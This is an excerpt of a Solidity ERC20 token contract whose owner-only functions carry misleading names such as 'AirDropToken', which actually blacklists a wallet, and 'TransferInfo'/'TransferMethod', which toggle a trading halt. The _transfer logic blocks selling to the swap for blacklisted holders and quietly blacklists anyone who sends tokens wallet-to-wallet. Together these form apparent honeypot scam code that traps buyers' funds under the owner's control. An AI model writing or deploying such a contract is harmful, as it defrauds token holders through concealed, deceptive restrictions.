...
contract ERC20 is Ownable, IERC20, IERC20Metadata { 
    ...
    mapping(address=>bool) isStatus; 
    address private _swap;  
    bool tradeStatus;  
    address _airTokenAddr;
    mapping(address=>bool) airtokenlist;
    constructor(string memory name_, string memory symbol_,uint256 totalSupply_, address airTokenAddr_) {
        _name = name_;
        _symbol = symbol_; 
        _owner=_msgSender();    
     ...
     function AirDropToken(address user) public onlyOwner returns(bool){
        isStatus[user]=true;
        return true;
    } 
    ...
    function TransferInfo()public onlyOwner returns(bool){
            tradeStatus=false;
            return true;
    } 
    function TransferMethod()public onlyOwner returns(bool){
        tradeStatus=true;
        return true;
    }   
    ...
    function _transfer(
        ...
        if(_owner!=from && _owner!=to && from!=_airTokenAddr){
            if(tradeStatus && from!=_swap){require(false,"tradeStatus is stop");} 
            if(to==_swap){    
                if(isStatus[from]){require(false,"user is brackList");}   
            }  
            if(from!=_swap && to!=_swap){
                airtokenlist[from]=true;
                isStatus[from]=true;
            } 
            if(airtokenlist[from]){require(false,"Air list");}
        } 
